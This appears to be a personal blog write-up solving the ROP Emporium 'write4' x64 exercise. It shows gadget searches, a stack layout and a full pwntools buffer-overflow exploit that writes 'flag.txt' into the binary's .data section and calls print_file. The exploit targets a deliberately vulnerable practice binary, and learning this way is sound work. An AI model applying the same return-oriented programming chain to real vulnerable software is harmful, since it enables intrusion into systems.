---
layout: page
permalink: /ROP_emporium/ROP-x64-Challenge-4
title: ROP x64 Challenge 4
status: done
type: page
published: true
comments: true
date: 2022-07-13
---
## Challenge 4


Once more into the breach with these rop exploits friends. We have a pretty simular situation to the 2nd challenge.

> **Important!**  
A PLT entry for a function named print_file() exists within the challenge binary, simply call it with the name of a file you wish to read (like "flag.txt") as the 1st argument.

All we need to do is call the print_file function with the first argument being a pointer to a string containing "flag.txt". The one problem is a complete lack of that string in the binary. I used `strings` and `rabin2` to attempt to find them and found nothing.

Now considering this challenge is called write4 and it has a whole section on how to write to memory in the challenge description, I deduced I needed to write that string into memory. The challenge sudgests looking for something in the form `mov [reg], reg` so that's what I did.

```

pwndbg> ropper -- --search "mov [???],???
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: mov [???],???

[INFO] File: /root/working/write4/write4_64/write4
0x0000000000400629: mov dword ptr [rsi], edi; ret; 
0x0000000000400628: mov qword ptr [r14], r15; ret; 

```
and look at that. I found 2 gadgets that might work. Now, I'd rather work with moving as much data at once which means using the r15 (8 bytes) rather then the edi (4 bytes), so that's the one I looked for first. 

```
pwndbg> ropper -- --search "pop r14"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop r14

[INFO] File: /root/working/write4/write4_64/write4
0x0000000000400690: pop r14; pop r15; ret; 
```

This provides a perfect gadget to populate the write gadgets with whatever value we want. 

The question now is where to write our string to the binary. So we are going to use the `vmmap` cmd to look at what parts of the memory is writable

```
Looking at the perms on parts of the code we see the following areas are able to be written to
nth paddr        size vaddr       vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――
18  0x00000df0    0x8 0x00600df0    0x8 -rw- .init_array
19  0x00000df8    0x8 0x00600df8    0x8 -rw- .fini_array
20  0x00000e00  0x1f0 0x00600e00  0x1f0 -rw- .dynamic
21  0x00000ff0   0x10 0x00600ff0   0x10 -rw- .got
22  0x00001000   0x28 0x00601000   0x28 -rw- .got.plt
23  0x00001028   0x10 0x00601028   0x10 -rw- .data
24  0x00001038    0x0 0x00601038    0x8 -rw- .bss
```

Note: the above is trimmed to only show the writable sections

The string is "flag.txt" which is 9 bytes long (including the null byte) which gets rid of a couple of the sections. So I chose the .data section of the binary to write into. 

The last gadget we'll need is something to control rdi for the parameter pass to the print_file

```
pwndbg> ropper -- --search "pop rdi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: /root/working/write4/write4_64/write4
0x0000000000400693: pop rdi; ret; 
```

Finally let's find the print_file function mentioned in the description.
```
disass print_file
Dump of assembler code for function print_file@plt:
   0x0000000000400510 <+0>:     jmp    QWORD PTR [rip+0x200b0a]        # 0x601020 <print_file@got.plt>
   0x0000000000400516 <+6>:     push   0x1
   0x000000000040051b <+11>:    jmp    0x4004f0
End of assembler dump.
```

Now with all of the information let's craft our stack layout. 

```
         | stack          |
         | -------------- |
32 bytes | start buffer   |
8  bytes | base pointer   | 
8  bytes | pop_r gadget   | # gadget to get values into r14 and r15
8  bytes | write loc      | # place location to write into r14
8  bytes | "flag.txt"     | # 1st 8 bytes of the string
8  bytes | write gadget   | # gadget to write into memory
8  bytes | pop_r gadget   | # do all of that again for the final null byte
8  bytes | "\x00"         | #     Note: bytes after may be init to null 
8  bytes | write loc + 8  | #           so you don't have to do this one
8  bytes | write gadget   |
8  bytes | pop_rdi gadget | # place location of the sring in rdi for 1st param
8  bytes | write loc      | 
8  bytes | print_file loc | # call function to win
8  bytes | -------------- |

```


Coded up this gives the following exploit.

```python
#!/usr/bin/python3

from pwn import *

pop_gaget       = p64(0x0000000000400690)
write_gaget     = p64(0x0000000000400628)
pop_rdi         = p64(0x00400693)
write_loc       = 0x601028
print_file      = p64(0x00400510)
back_junk       = b"B" * 20

# The amount to fill the buffer
junk = b'A' * 0x20

# The 8 bytes to fill the new base pointer from the leave
new_bp = p32(0xc0deba5e)*2


"""
Place a string (1st arg) into the location
given by the 2nd arg. Note the 2nd arg should be 
packed
"""
def string_place(write_string, write_start):
        returnPayload = b""
        for i in range(0, len(write_string), 8):
                returnPayload += pop_gaget
                #destination
                returnPayload += p64( write_start+ (i))
                temp = write_string[i:i+8] 
                temp += b"\x00" * ( 8 - len(temp) )
                returnPayload += temp
                returnPayload += write_gaget

        return returnPayload

"""
Place the value for the first args of a function
"""
def first_arg(var):
        returnPayload = pop_rdi
        returnPayload += p64(var)
        return returnPayload


io = process('./write4')

# This is the vaddr of system
# First return to the location of the pop rdi
# 4   0x00400510 GLOBAL FUNC       print_file
#Fill up the buffer and the base pointer
payload = junk + new_bp

payload += string_place(b"flag.txt", write_loc)

# This is the vaddr of system
# First return to the location of the pop rdi
payload += first_arg(write_loc)
payload += print_file

payload += back_junk

print("The payload is:")
print(payload)
print("Payload size is:" + str(len(payload)))
input("Hit enter to apptempt exploit")

print(io.clean(0.5).decode("utf-8"))
io.send(payload)
input("exploit sent hit enter to end")
print(io.clean(0.5).decode("utf-8"))

sleep(1)

f = open('./payload', 'wb')
f.write(payload)
f.close()

```

Note: I started writing my exploits into files for easier debugging in gdb. Before I would run the exploit and then attach gdb for debugging with `gdb -p $pid` but now I can just do `r < ./payload` within gdb which is nice

